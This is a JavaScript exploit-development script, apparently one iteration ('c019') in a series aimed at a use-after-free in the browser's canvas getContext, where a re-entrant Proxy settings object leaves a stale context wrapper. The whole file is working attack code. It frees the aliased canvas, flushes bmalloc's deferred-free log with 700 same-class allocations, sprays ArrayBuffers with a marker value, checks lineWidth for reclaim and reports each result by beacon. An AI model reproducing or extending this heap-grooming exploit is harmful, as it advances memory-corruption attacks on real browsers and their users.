// c019: does the slot need bmalloc's deferred-free log flushed before an AB spray can take it?
//
// c018 ran the corrected sequence (no beacons in the window, free the aliased owner, churn, wait) and still
// read lw=1 through the stale wrapper - i.e. the object was never released. bmalloc pushes freed small
// objects into a per-thread log and only processes it at 512 entries or on an allocator slow path, and the
// 192MB churn in c018 is large-path allocation, which does not drain the small-class log.
//
// Two attempts in one run, so one console round-trip yields both answers:
//   A0   - no flush (control, should reproduce c018's no-reclaim)
//   B700 - allocate and drop 700 same-class canvas contexts first, pushing >512 frees through the log
(function () {
  var LOG = [];
  function note(s) { LOG.push(s); }
  function flush() { for (var i = 0; i < LOG.length; i++) { try { navigator.sendBeacon('/beacon', 'c019-' + LOG[i]); } catch (e) {} } }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  function proxySettings(c, cap) {
    var fired = false;
    function fire() { if (!fired) { fired = true; cap.inner = c.getContext('2d'); } }
    return new Proxy({}, {
      get: function () { fire(); return false; },
      has: function () { fire(); return true; }
    });
  }
  function mkCanvas(i) {
    var c = document.createElement('canvas');
    c.width = 8; c.height = 8; c.id = 's' + i;
    return [c, c.getContext('2d')];
  }

  async function attempt(tag, flushFrees) {
    var cap = { inner: null, outer: null };
    var c1 = document.createElement('canvas');
    c1.width = 8; c1.height = 8; c1.id = 'orig';
    try { cap.outer = c1.getContext('2d', proxySettings(c1, cap)); }
    catch (e) { note(tag + ':trigger-err'); return; }

    var sp = [];
    for (var i = 0; i < 500; i++) sp.push(mkCanvas(i));
    var idx = -1;
    try {
      var ident = cap.inner.canvas.id;
      if (ident && ident.charAt(0) === 's') idx = parseInt(ident.slice(1), 10);
    } catch (e) { note(tag + ':alias-err:' + e.name); return; }
    note(tag + ':alias=' + idx);
    if (idx < 0) return;

    // free the aliased owner
    var keep = sp[idx]; sp[idx] = null; keep[0] = null; keep[1] = null;

    // drain the small-class deallocator: each dropped context is one same-class free
    if (flushFrees > 0) {
      var tmp = [];
      for (var k = 0; k < flushFrees; k++) tmp.push(mkCanvas(2000 + k));
      note(tag + ':frees=' + tmp.length);
      tmp = null;
    }

    try { var j = []; for (var m = 0; m < 6; m++) j.push(new Float64Array(4 * 1024 * 1024)); j = null; } catch (e) {}
    await sleep(1200);

    var abs = [];
    for (i = 0; i < 500; i++) {
      var ab = new ArrayBuffer(768);
      var f64 = new Float64Array(ab);
      for (var s = 0; s < 96; s++) f64[s] = 9999.99;
      abs.push(ab);
    }
    await sleep(300);

    var verdict;
    try {
      var lw = cap.inner.lineWidth;
      verdict = (lw === 9999.99) ? 'RECLAIMED' : ('lw=' + lw + ' no-reclaim');
    } catch (e) { verdict = 'lw-err:' + e.name; }
    note(tag + ':' + verdict);
  }

  (async function () {
    note('boot');
    await attempt('A0', 0);
    await attempt('B700', 700);
    note('done');
    flush();
  })();
})();
